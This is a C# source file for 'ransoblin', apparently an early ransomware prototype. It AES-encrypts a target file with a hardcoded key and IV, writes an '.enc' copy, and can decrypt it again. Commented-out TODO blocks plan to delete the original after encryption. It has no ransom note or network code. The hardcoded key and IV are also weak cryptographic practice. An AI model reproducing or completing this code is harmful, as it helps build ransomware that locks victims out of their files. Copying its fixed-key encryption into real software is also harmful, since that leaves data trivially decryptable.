using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Security.Cryptography;

namespace ransoblin
{
    public static class Program
    {
        // Key and IV variables - 16 bytes length
        public static byte[] key = new byte[16];
        public static byte[] iv = new byte[16];

        public static T[] SubArray<T>(this T[] data, int index, int length)
        {
            T[] result = new T[length];
            Array.Copy(data, index, result, 0, length);
            return result;
        }

        public static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Wrong parameters, please use the followings:\n" +
                    " ransoblin encrypt targetfilepath\n" +
                    " ransoblin encrypt targetfilepath outputfilepath\n" +
                    " ransoblin decrypt targetfilepath\n" +
                    " ransoblin decrypt targetfilepath outputfilepath\n");
                return;
            }

            Console.WriteLine("Ransoblin is starting...");
            Console.WriteLine("Limitations: Hardcoded key and iv are used, the file is not deleted.");

            try
            {
                // Hardcoded Key and IV for now.
                // TODO: Implement parameters for it.
                string keystring = "DEADB33FG00DB33F";
                string ivstring = "9872983742349812";

                // Common variables
                byte[] inputbuffer;
                string filename;
                string output_filename;

                switch (args[0])
                {
                    case "encrypt":
                        // Getting the file content 
                        filename = args[1];
                        if (args.Length > 2)
                        {
                            output_filename = args[2];
                        }
                        else
                        {
                            output_filename = filename + ".enc";
                        }

                        inputbuffer = File.ReadAllBytes(filename);
                        Console.WriteLine("Reading {0} is successful.", filename);

                        // Encrypting the content
                        byte[] encryptedfilecontent = Encrypt(inputbuffer, keystring, ivstring);
                        Console.WriteLine("Content encrypted successfully.");

                        // Writing the content to the local file
                        File.WriteAllBytes(output_filename, encryptedfilecontent);
                        Console.WriteLine("Saving {0} is successful.", output_filename);

                        // TODO: Implement a parameter for deleting the target file
                        //if (File.Exists(filename) && FILEDELETE)
                        //{
                        //    File.Delete(filename);
                        //}
                        break;
                    case "decrypt":
                        // Getting the file content 
                        filename = args[1];
                        if (args.Length > 2)
                        {
                            output_filename = args[2];
                        }
                        else
                        {
                            output_filename = filename + ".dec";
                        }
                        inputbuffer = File.ReadAllBytes(filename);
                        Console.WriteLine("Reading {0} is successful.", filename);

                        // Decrypting the content
                        byte[] decryptedfilecontent = Decrypt(inputbuffer, keystring, ivstring);
                        Console.WriteLine("Content decrypted successfully.");

                        // Writing the content to the local file
                        File.WriteAllBytes(output_filename, decryptedfilecontent);
                        Console.WriteLine("Saving {0} is successful.", output_filename);

                        // TODO: Implement a parameter for deleting the target file
                        //if (File.Exists(filename) && FILEDELETE)
                        //{
                        //    File.Delete(filename);
                        //}
                        break;
                    default:
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error Message:\n{0}", ex);
            }

            


        }

        public static byte[] Encrypt(byte[] inputbuffer, string keystring, string ivstring)
        {
            Array.Copy(Encoding.UTF8.GetBytes(keystring), key, 16);
            Array.Copy(Encoding.UTF8.GetBytes(ivstring), iv, 16);

            SymmetricAlgorithm algorithm = Aes.Create();
            ICryptoTransform transform = algorithm.CreateEncryptor(key, iv);
            byte[] outputBuffer = transform.TransformFinalBlock(inputbuffer, 0, inputbuffer.Length);
            return outputBuffer;
        }

        public static byte[] Decrypt(byte[] inputbuffer, string keystring, string ivstring)
        {
            Array.Copy(Encoding.UTF8.GetBytes(keystring), key, 16);
            Array.Copy(Encoding.UTF8.GetBytes(ivstring), iv, 16);

            SymmetricAlgorithm algorithm = Aes.Create();
            ICryptoTransform transform = algorithm.CreateDecryptor(key, iv);
            byte[] outputBuffer = transform.TransformFinalBlock(inputbuffer, 0, inputbuffer.Length);
            return outputBuffer;
        }
    }
}
